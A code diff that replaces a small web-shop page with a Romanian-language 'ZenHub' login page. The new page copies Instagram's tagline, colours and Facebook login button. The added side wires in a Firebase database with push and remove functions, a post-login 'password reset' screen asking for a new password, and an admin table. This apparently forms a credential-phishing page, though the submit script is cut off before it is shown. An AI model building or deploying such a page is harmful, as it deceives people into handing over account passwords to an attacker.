@@ -1,1238 +1,807 @@
 <!DOCTYPE html>
-<html lang="hu">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>WebShop - Auto-Code Generator & Self-Modifying Shop</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-        }
-
-        .navbar {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 1rem 2rem;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 1rem;
-            flex-wrap: wrap;
-        }
-
-        .nav-links button {
-            padding: 0.5rem 1rem;
-            background: #667eea;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: transform 0.3s;
-        }
-
-        .nav-links button:hover {
-            transform: translateY(-2px);
-        }
-
-        .save-notice {
-            background: #48bb78;
-            color: white;
-            padding: 0.3rem 0.8rem;
-            border-radius: 20px;
-            font-size: 0.8rem;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 2rem auto;
-            padding: 0 1rem;
-        }
-
-        .products-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 2rem;
-            margin-top: 2rem;
-        }
-
-        .product-card {
-            background: white;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            transition: transform 0.3s;
-            position: relative;
-        }
-
-        .product-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .product-image {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-            background: #f0f0f0;
-        }
-
-        .product-info {
-            padding: 1rem;
-        }
-
-        .product-title {
-            font-size: 1.2rem;
-            font-weight: bold;
-            margin-bottom: 0.5rem;
-        }
-
-        .product-price {
-            color: #667eea;
-            font-size: 1.3rem;
-            font-weight: bold;
-            margin: 0.5rem 0;
-        }
-
-        .add-to-cart {
-            width: 100%;
-            padding: 0.8rem;
-            background: #667eea;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .delete-product {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: #f56565;
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            cursor: pointer;
-            font-size: 18px;
-            z-index: 10;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 2000;
-            overflow-y: auto;
-        }
-
-        .modal-content {
-            background: white;
-            margin: 2rem auto;
-            padding: 2rem;
-            width: 90%;
-            max-width: 800px;
-            border-radius: 10px;
-            position: relative;
-        }
-
-        .close {
-            position: absolute;
-            right: 1rem;
-            top: 1rem;
-            font-size: 2rem;
-            cursor: pointer;
-        }
-
-        .owner-panel {
-            background: white;
-            padding: 2rem;
-            border-radius: 10px;
-            margin-top: 2rem;
-        }
-
-        .form-group {
-            margin-bottom: 1rem;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: bold;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 0.5rem;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-
-        .qr-item {
-            background: #f9f9f9;
-            padding: 1rem;
-            margin: 0.5rem 0;
-            border-radius: 5px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .delete-qr {
-            background: #f56565;
-            color: white;
-            border: none;
-            padding: 0.5rem 1rem;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .cart-items {
-            max-height: 400px;
-            overflow-y: auto;
-        }
-
-        .cart-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem;
-            border-bottom: 1px solid #eee;
-        }
-
-        .cart-total {
-            margin-top: 1rem;
-            padding-top: 1rem;
-            border-top: 2px solid #667eea;
-            font-size: 1.3rem;
-            font-weight: bold;
-        }
-
-        .map-container {
-            margin: 1rem 0;
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        #map, #pickup-map, #confirmation-map {
-            height: 400px;
-            width: 100%;
-            border-radius: 10px;
-        }
-
-        .pickup-info {
-            background: #f0f0f0;
-            padding: 1rem;
-            border-radius: 5px;
-            margin: 1rem 0;
-        }
-
-        .selected-point {
-            background: #48bb78;
-            color: white;
-            padding: 0.5rem;
-            border-radius: 5px;
-            text-align: center;
-        }
-
-        .alert {
-            position: fixed;
-            top: 80px;
-            right: 20px;
-            padding: 1rem;
-            border-radius: 5px;
-            z-index: 3000;
-            animation: slideIn 0.3s;
-        }
-
-        .alert-success { background: #48bb78; color: white; }
-        .alert-error { background: #f56565; color: white; }
-        .alert-info { background: #4299e1; color: white; }
-
-        @keyframes slideIn {
-            from { transform: translateX(100%); }
-            to { transform: translateX(0); }
-        }
-
-        .orders-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 1rem;
-        }
-
-        .orders-table th, .orders-table td {
-            border: 1px solid #ddd;
-            padding: 0.8rem;
-            text-align: left;
-        }
-
-        .orders-table th {
-            background: #667eea;
-            color: white;
-        }
-
-        .status-paid {
-            background: #48bb78;
-            color: white;
-            padding: 0.3rem 0.6rem;
-            border-radius: 3px;
-            display: inline-block;
-        }
-
-        .status-cash {
-            background: #ed8936;
-            color: white;
-            padding: 0.3rem 0.6rem;
-            border-radius: 3px;
-            display: inline-block;
-        }
-
-        .download-code-btn {
-            background: #48bb78;
-            color: white;
-            border: none;
-            padding: 0.8rem 1.5rem;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1rem;
-            margin: 1rem 0;
-        }
-
-        @media (max-width: 768px) {
-            .navbar { flex-direction: column; gap: 1rem; }
-            .nav-links { justify-content: center; }
-            .modal-content { margin: 1rem; padding: 1rem; }
-        }
-    </style>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
-</head>
-<body>
-    <div class="navbar">
-        <h2>🛍️ WebShop Romania <span class="save-notice" id="save-notice">💾 Auto-Code Generator</span></h2>
-        <div class="nav-links">
-            <button onclick="showProducts()">🏪 Shop</button>
-            <button onclick="showCart()">🛒 Cart (<span id="cart-count">0</span>)</button>
-            <button onclick="showQRScanner()">📷 Scan QR</button>
-            <button onclick="showOwnerLogin()">👑 Owner</button>
-            <button onclick="downloadFullCode()" style="background:#48bb78;">💾 Save as HTML</button>
-        </div>
-    </div>
-
-    <div class="container" id="app"></div>
-
-    <!-- Cart Modal -->
-    <div id="cart-modal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeCart()">&times;</span>
-            <h2>Your Cart</h2>
-            <div id="cart-items"></div>
-            <div class="cart-total" id="cart-total"></div>
-            <button onclick="showPickupSelection()" style="width:100%;padding:1rem;background:#48bb78;color:white;border:none;border-radius:5px;margin-top:1rem;">Continue to Pickup</button>
-        </div>
-    </div>
-
-    <!-- Pickup Location Modal -->
-    <div id="pickup-modal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closePickupModal()">&times;</span>
-            <h2>📍 Click on the map to select pickup location</h2>
-            <div class="map-container">
-                <div id="pickup-map"></div>
-            </div>
-            <div id="selected-location-info" class="pickup-info" style="display:none;">
-                <div class="selected-point">✓ Selected Pickup Point</div>
-                <p id="selected-address"></p>
-            </div>
-            <div class="form-group">
-                <label>Your Full Name (required):</label>
-                <input type="text" id="customer-name" placeholder="Enter your full name">
-            </div>
-            <button onclick="confirmPickupAndPay()" style="width:100%;padding:1rem;background:#48bb78;color:white;border:none;border-radius:5px;margin-top:1rem;">Confirm Order</button>
-        </div>
-    </div>
-
-    <!-- QR Scanner Modal -->
-    <div id="qr-scanner-modal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeQRScannerModal()">&times;</span>
-            <h2>📷 QR Code Scanner</h2>
-            <div id="qr-reader" style="width:100%;max-width:500px;margin:0 auto;"></div>
-            <div style="margin-top:1rem;display:flex;gap:1rem;justify-content:center;">
-                <button onclick="startScanner()" style="padding:0.5rem 1rem;background:#667eea;color:white;border:none;border-radius:5px;">Start Camera</button>
-                <button onclick="stopScanner()" style="padding:0.5rem 1rem;background:#f56565;color:white;border:none;border-radius:5px;">Stop</button>
-                <button onclick="showManualQR()" style="padding:0.5rem 1rem;background:#48bb78;color:white;border:none;border-radius:5px;">Manual Entry</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Manual QR Modal -->
-    <div id="manual-qr-modal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeManualQRModal()">&times;</span>
-            <h2>Enter QR Code</h2>
-            <input type="text" id="manual-qr-input" placeholder="QR Code" style="width:100%;padding:0.8rem;margin:1rem 0;border:1px solid #ddd;border-radius:5px;">
-            <button onclick="verifyManualQR()" style="width:100%;padding:0.8rem;background:#667eea;color:white;border:none;border-radius:5px;">Verify</button>
-        </div>
-    </div>
-
-    <!-- Owner Login Modal -->
-    <div id="owner-modal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeOwnerModal()">&times;</span>
-            <h2>Owner Login</h2>
-            <input type="email" id="owner-email" placeholder="owner@webshop.com" style="width:100%;padding:0.8rem;margin:1rem 0;border:1px solid #ddd;border-radius:5px;">
-            <button onclick="ownerLogin()" style="width:100%;padding:0.8rem;background:#667eea;color:white;border:none;border-radius:5px;">Login</button>
-        </div>
-    </div>
-
-    <!-- Balance Modal -->
-    <div id="balance-modal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeBalanceModal()">&times;</span>
-            <h2>💰 Your Balance</h2>
-            <div style="text-align:center;padding:2rem;">
-                <h3 style="font-size:3rem;color:#667eea;">$<span id="user-balance">0</span></h3>
-                <p>✓ Weekly $100 added automatically!</p>
-                <button onclick="closeBalanceModal()" style="margin-top:1rem;padding:0.5rem 2rem;background:#667eea;color:white;border:none;border-radius:5px;">Continue</button>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // ============ DATA STORAGE - ALL DATA IS AUTO-SAVED ============
-        let products = [];
-        let activeQRs = [];
-        let qrUsers = {};
-        let orders = [];
-        let cart = [];
-        let currentUser = null;
-        let isOwner = false;
-        let selectedPickupPoint = null;
-        let html5QrCode = null;
-        let isScanning = false;
-        let pickupMap = null;
-        
-        const OWNER_EMAIL = "owner@webshop.com";
-        
-        // ============ AUTO-LOAD DATA ============
-        function loadAllData() {
-            // Load products from localStorage
-            const savedProducts = localStorage.getItem('webshop_products_final');
-            if (savedProducts) {
-                products = JSON.parse(savedProducts);
-                console.log('📦 Products loaded:', products.length);
-            } else {
-                // Default products
-                products = [
-                    { id: 1, name: "Premium T-Shirt", price: 29.99, image: "https://via.placeholder.com/200/667eea/ffffff?text=T-Shirt" },
-                    { id: 2, name: "Designer Jeans", price: 79.99, image: "https://via.placeholder.com/200/764ba2/ffffff?text=Jeans" },
-                    { id: 3, name: "Sport Shoes", price: 89.99, image: "https://via.placeholder.com/200/48bb78/ffffff?text=Shoes" }
-                ];
-                saveProducts();
-            }
-            
-            // Load QR codes
-            const savedQRs = localStorage.getItem('webshop_qrs_final');
-            if (savedQRs) {
-                activeQRs = JSON.parse(savedQRs);
-                console.log('🔑 QR codes loaded:', activeQRs.length);
-            } else {
-                activeQRs = [];
-            }
-            
-            // Load QR users
-            const savedUsers = localStorage.getItem('webshop_users_final');
-            if (savedUsers) {
-                qrUsers = JSON.parse(savedUsers);
-            } else {
-                qrUsers = {};
-            }
-            
-            // Load orders
-            const savedOrders = localStorage.getItem('webshop_orders_final');
-            if (savedOrders) {
-                orders = JSON.parse(savedOrders);
-                console.log('📋 Orders loaded:', orders.length);
-            } else {
-                orders = [];
-            }
-            
-            // Load cart
-            const savedCart = localStorage.getItem('webshop_cart_final');
-            if (savedCart) {
-                cart = JSON.parse(savedCart);
-            } else {
-                cart = [];
-            }
-            
-            updateCartCount();
-            updateSaveNotice();
-        }
-        
-        // ============ SAVE FUNCTIONS (AUTO-SAVE TO LOCALSTORAGE) ============
-        function saveProducts() {
-            localStorage.setItem('webshop_products_final', JSON.stringify(products));
-            updateSaveNotice();
-            console.log('💾 Products AUTO-SAVED to localStorage!');
-        }
-        
-        function saveQRs() {
-            localStorage.setItem('webshop_qrs_final', JSON.stringify(activeQRs));
-            updateSaveNotice();
-            console.log('💾 QR Codes AUTO-SAVED to localStorage!');
-        }
-        
-        function saveUsers() {
-            localStorage.setItem('webshop_users_final', JSON.stringify(qrUsers));
-            updateSaveNotice();
-        }
-        
-        function saveOrders() {
-            localStorage.setItem('webshop_orders_final', JSON.stringify(orders));
-            updateSaveNotice();
-            console.log('💾 Orders AUTO-SAVED to localStorage!');
-        }
-        
-        function saveCart() {
-            localStorage.setItem('webshop_cart_final', JSON.stringify(cart));
-        }
-        
-        function updateSaveNotice() {
-            const notice = document.getElementById('save-notice');
-            if (notice) {
-                notice.style.background = '#fbbf24';
-                notice.innerHTML = '💾 Saving...';
-                setTimeout(() => {
-                    notice.style.background = '#48bb78';
-                    notice.innerHTML = '✓ Auto-Saved';
-                    setTimeout(() => {
-                        notice.innerHTML = '💾 Auto-Code Generator';
-                    }, 1500);
-                }, 500);
-            }
-        }
-        
-        // ============ DOWNLOAD FULL HTML CODE ============
-        function downloadFullCode() {
-            // Get current data as embedded code
-            const currentProducts = JSON.stringify(products);
-            const currentQRs = JSON.stringify(activeQRs);
-            const currentUsers = JSON.stringify(qrUsers);
-            const currentOrders = JSON.stringify(orders);
-            
-            // Create the full HTML with embedded data
-            const fullHTML = `<!DOCTYPE html>
-<html lang="hu">
+<html lang="ro">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebShop - Generated Code</title>
+    <title>ZenHub</title>
+    <!-- Firebase SDK-k -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, push, onValue, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        // --- A TE FIREBASE KONFIGURÁCIÓD ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5-QlR0y56polIINHe1GoosOFhjxK3FkI",
+            authDomain: "website-49e11.firebaseapp.com",
+            databaseURL: "https://website-49e11-default-rtdb.firebaseio.com",
+            projectId: "website-49e11",
+            storageBucket: "website-49e11.firebasestorage.app",
+            messagingSenderId: "965897374757",
+            appId: "1:965897374757:web:3a35fdb24c9e821f4b83cc",
+            measurementId: "G-LFV26YEPEB"
+        };
+        // -----------------------------------
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Globális változók
+        window.db = db;
+        window.ref = ref;
+        window.push = push;
+        window.onValue = onValue;
+        window.remove = remove;
+    </script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
-        .navbar { background: rgba(255,255,255,0.95); padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; position: sticky; top: 0; z-index: 1000; }
-        .nav-links { display: flex; gap: 1rem; flex-wrap: wrap; }
-        .nav-links button { padding: 0.5rem 1rem; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        .container { max-width: 1200px; margin: 2rem auto; padding: 0 1rem; }
-        .products-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 2rem; margin-top: 2rem; }
-        .product-card { background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.1); position: relative; }
-        .product-image { width: 100%; height: 200px; object-fit: cover; }
-        .product-info { padding: 1rem; }
-        .product-title { font-size: 1.2rem; font-weight: bold; }
-        .product-price { color: #667eea; font-size: 1.3rem; font-weight: bold; margin: 0.5rem 0; }
-        .add-to-cart { width: 100%; padding: 0.8rem; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        .delete-product { position: absolute; top: 10px; right: 10px; background: #f56565; color: white; border: none; border-radius: 50%; width: 30px; height: 30px; cursor: pointer; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2000; overflow-y: auto; }
-        .modal-content { background: white; margin: 2rem auto; padding: 2rem; width: 90%; max-width: 800px; border-radius: 10px; position: relative; }
-        .close { position: absolute; right: 1rem; top: 1rem; font-size: 2rem; cursor: pointer; }
-        .owner-panel { background: white; padding: 2rem; border-radius: 10px; margin-top: 2rem; }
-        .form-group { margin-bottom: 1rem; }
-        .form-group input { width: 100%; padding: 0.5rem; border: 1px solid #ddd; border-radius: 5px; }
-        .qr-item { background: #f9f9f9; padding: 1rem; margin: 0.5rem 0; border-radius: 5px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
-        .delete-qr { background: #f56565; color: white; border: none; padding: 0.5rem 1rem; border-radius: 5px; cursor: pointer; }
-        .cart-items { max-height: 400px; overflow-y: auto; }
-        .cart-item { display: flex; justify-content: space-between; align-items: center; padding: 1rem; border-bottom: 1px solid #eee; }
-        .cart-total { margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #667eea; font-size: 1.3rem; font-weight: bold; }
-        .map-container { margin: 1rem 0; border-radius: 10px; overflow: hidden; }
-        #pickup-map { height: 400px; width: 100%; border-radius: 10px; }
-        .alert { position: fixed; top: 80px; right: 20px; padding: 1rem; border-radius: 5px; z-index: 3000; animation: slideIn 0.3s; }
-        .alert-success { background: #48bb78; color: white; }
-        .alert-error { background: #f56565; color: white; }
-        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
-        @media (max-width: 768px) { .navbar { flex-direction: column; gap: 1rem; } }
+        /* Alap stílusok */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #262626;
+        }
+
+        /* --- FŐOLDAL STÍLUSOK --- */
+        .main-container {
+            display: flex;
+            flex: 1;
+            max-width: 935px;
+            margin: 0 auto;
+            padding-top: 32px;
+            width: 100%;
+        }
+
+        .left-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding-right: 32px;
+            position: relative;
+        }
+
+        .logo-container {
+            position: absolute;
+            top: 20px;
+            left: 0;
+        }
+
+        .logo-container img {
+            height: 60px;
+            width: auto;
+        }
+
+        .hero-text {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .hero-text h1 {
+            font-size: 40px;
+            font-weight: 400;
+            line-height: 1.2;
+            color: #262626;
+            margin-bottom: 10px;
+        }
+
+        .hero-text h1 span {
+            color: #E1306C;
+            font-weight: 600;
+        }
+
+        .hero-image-container {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .hero-image-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .right-section {
+            width: 350px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding-left: 32px;
+            border-left: 1px solid #dbdbdb;
+        }
+
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px 30px;
+            text-align: center;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+
+        .login-box h2 {
+            font-size: 17px;
+            font-weight: 600;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: opacity 0.2s;
+        }
+
+        .btn-primary {
+            background-color: #0095f6;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            opacity: 0.9;
+        }
+
+        .btn-secondary {
+            background-color: #efefef;
+            color: #262626;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-secondary:hover {
+            background-color: #dbdbdb;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 18px;
+        }
+
+        .meta-logo {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        /* --- LÁBLÉC --- */
+        footer {
+            padding: 30px 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+            border-top: 1px solid #dbdbdb;
+            margin-top: 40px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+        }
+
+        .language-selector {
+            background: transparent;
+            border: none;
+            color: #8e8e8e;
+            font-size: 12px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            outline: none;
+        }
+
+        /* --- JELSZÓ VISSZAÁLLÍTÓ OLDAL (Bejelentkezés UTÁN) --- */
+        .reset-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            padding: 40px 20px;
+        }
+
+        .reset-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .reset-box h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .reset-box p {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+        }
+
+        .reset-box input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+
+        .reset-box button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .success-message {
+            display: none;
+            color: #2ecc71;
+            font-weight: 600;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+
+        /* --- ADMIN PANEL --- */
+        .admin-container {
+            display: none;
+            flex-direction: column;
+            padding: 40px 20px;
+            max-width: 900px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .admin-container h2 {
+            margin-bottom: 20px;
+        }
+
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: #fff;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .admin-table th, .admin-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+        }
+
+        .admin-table th {
+            background: #fafafa;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .admin-table td {
+            font-size: 14px;
+        }
+
+        .admin-actions {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-danger {
+            background-color: #e74c3c;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .btn-danger:hover {
+            background-color: #c0392b;
+        }
+
+        .btn-logout {
+            background-color: #95a5a6;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        /* Reszponzivitás */
+        @media (max-width: 875px) {
+            .main-container {
+                flex-direction: column;
+                padding-top: 0;
+            }
+            .left-section {
+                display: none;
+            }
+            .right-section {
+                width: 100%;
+                padding: 20px;
+                border-left: none;
+            }
+            .login-box {
+                border: none;
+                background: transparent;
+                padding: 0;
+            }
+        }
     </style>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
 </head>
 <body>
-    <div class="navbar">
-        <h2>🛍️ WebShop Romania</h2>
-        <div class="nav-links">
-            <button onclick="showProducts()">🏪 Shop</button>
-            <button onclick="showCart()">🛒 Cart (<span id="cart-count">0</span>)</button>
-            <button onclick="showQRScanner()">📷 Scan QR</button>
-            <button onclick="showOwnerLogin()">👑 Owner</button>
+
+    <!-- ================= FŐOLDAL ================= -->
+    <div id="main-page" class="main-container">
+        <div class="left-section">
+            <div class="logo-container">
+                <!-- IDE JÖN A SAJÁT LOGÓD (BASE64) -->
+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxwYXRoIGQ9Ik0xMiAyYy0yLjIxIDAtMi41LjAxLTMuMzUuMDctLjg2LjA2LTEuNDUuMTgtMS45Ni4zOC0uNTMuMjEtLjk4LjQ5LTEuNDMuOTQtLjQ1LjQ1LS43My45LTEuNDMuOTQtLjQ1LjQ1LS43My45LTEuNDMuOTQtLjQ1LjQ1LS43My45LTEuNDMuOTQtLjQ1LjQ1LS43My45LTEuNDMuOTQtLjQ1LjQ1LS43My45LTEuNDMuOTQtLjQ1LjQ1LS43My45LTEuNDMuOTQtLjQ1LjQ1LS43My45LTEuNDMuOTQtLjQ1LjQ1LS43My45LTEuNDMuOTR6Ii8+PHBhdGggZD0iTTEyIDhhNCA0IDAgMSAwIDAgOCA0IDQgMCAwIDAgMC04eiIvPjxjaXJjbGUgY3g9IjE3LjUiIGN5PSI2LjUiIHI9IjEuNSIvPjwvc3ZnPg==" alt="Saját Logó" />
+            </div>
+
+            <div class="hero-text">
+                <h1 id="hero-title">
+                    Vezi în fiecare zi momente de la <br>
+                    <span>prieteni apropiați.</span>
+                </h1>
+            </div>
+
+            <div class="hero-image-container">
+                <!-- IDE JÖN A SAJÁT KÉPED (BASE64) -->
+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MDAiIGhlaWdodD0iMzAwIiB2aWV3Qm94PSIwIDAgNDAwIDMwMCI+PGRlZnM+PGxpbmVhckdyYWRpZW50IGlkPSJncmFkIiB4MT0iMCUiIHkxPSIwJSIgeDI9IjEwMCUiIHkyPSIxMDAlIj48c3RvcCBvZmZzZXQ9IjAlIiBzdHlsZT0ic3RvcC1jb2xvcjojRTMwNTZDLDpvcGFjaXR5OjEiIC8+PHN0b3Agb2Zmc2V0PSIxMDAlIiBzdHlsZT0ic3RvcC1jb2xvcjojRkM0MTVFLDpvcGFjaXR5OjEiIC8+PC9saW5lYXJHcmFkaWVudD48L2RlZnM+PHJlY3Qgd2lkdGg9IjQwMCIgaGVpZ2h0PSIzMDAiIGZpbGw9InVybCgjZ3JhZCkiIC8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGRvbWluYW50LWJhc2VsaW5lPSJtaWRkbGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IndoaXRlIiBmb250LXNpemU9IjIwIiBmb250LWZhbWlseT0iQXJpYWwiPkhhbmRzb21lIEtlcCAoQmFzZTY0KTwvdGV4dD48L3N2Zz4=" alt="Saját Kép" />
+            </div>
+        </div>
+
+        <div class="right-section">
+            <div class="login-box">
+                <h2 id="login-title">Conectează-te la ZenHub</h2>
+                
+                <form id="login-form">
+                    <div class="input-group">
+                        <input type="text" id="username" placeholder="Numărul de mobil, numele de utilizator sau adresa de e-mail" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Parolă" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary" id="btn-login">Conectare</button>
+                </form>
+
+                <a href="#" class="forgot-password" id="forgot-link">Ai uitat parola?</a>
+
+                <div class="divider">
+                    <span>SAU</span>
+                </div>
+
+                <button class="btn btn-secondary" id="btn-fb">
